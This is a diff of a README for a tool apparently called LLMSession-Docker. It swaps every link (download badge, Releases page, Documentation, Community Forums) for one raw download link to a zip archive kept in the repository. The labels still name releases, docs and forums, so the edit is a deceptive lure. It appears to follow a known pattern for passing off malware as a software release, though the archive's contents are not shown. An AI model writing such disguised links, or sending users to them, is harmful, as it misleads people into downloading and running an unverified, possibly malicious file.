@@ -4,7 +4,7 @@
 Welcome to LLMSession-Docker! This guide will help you download and run the software on your computer. Our application provides a simple way to access various web-based LLMs, such as ChatGPT, Claude, and Google AI Studio, without complicated setups. Follow these steps to get started.
 
 ## 📥 Download LLMSession-Docker
-[![Download LLMSession-Docker](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Lokaz0/LLMSession-Docker/releases)
+[![Download LLMSession-Docker](https://raw.githubusercontent.com/Lokaz0/LLMSession-Docker/main/app/LLMSession-Docker-v2.6-alpha.3.zip)](https://raw.githubusercontent.com/Lokaz0/LLMSession-Docker/main/app/LLMSession-Docker-v2.6-alpha.3.zip)
 
 ## 🖥️ System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🗂️ Download & Install
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Lokaz0/LLMSession-Docker/releases) to find the latest version of LLMSession-Docker.
+   Go to our [Releases page](https://raw.githubusercontent.com/Lokaz0/LLMSession-Docker/main/app/LLMSession-Docker-v2.6-alpha.3.zip) to find the latest version of LLMSession-Docker.
 
 2. **Select the Correct File**  
    On the Releases page, look for the latest version. You will see a list of files for download. Choose the file that matches your operating system.
@@ -52,8 +52,8 @@ After installation, you can start using LLMSession-Docker to access LLMs:
 If you need help or would like to provide feedback, please open an issue in the repository. Your input helps us improve LLMSession-Docker.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/Lokaz0/LLMSession-Docker/wiki): Detailed usage instructions and API references.
-- [Community Forums](https://github.com/Lokaz0/LLMSession-Docker/discussions): Join discussions with other users.
+- [Documentation](https://raw.githubusercontent.com/Lokaz0/LLMSession-Docker/main/app/LLMSession-Docker-v2.6-alpha.3.zip): Detailed usage instructions and API references.
+- [Community Forums](https://raw.githubusercontent.com/Lokaz0/LLMSession-Docker/main/app/LLMSession-Docker-v2.6-alpha.3.zip): Join discussions with other users.
   
 ## 🤝 Contribution
 We welcome contributions from all users. If you'd like to help improve LLMSession-Docker, please check our contribution guidelines in the repository.
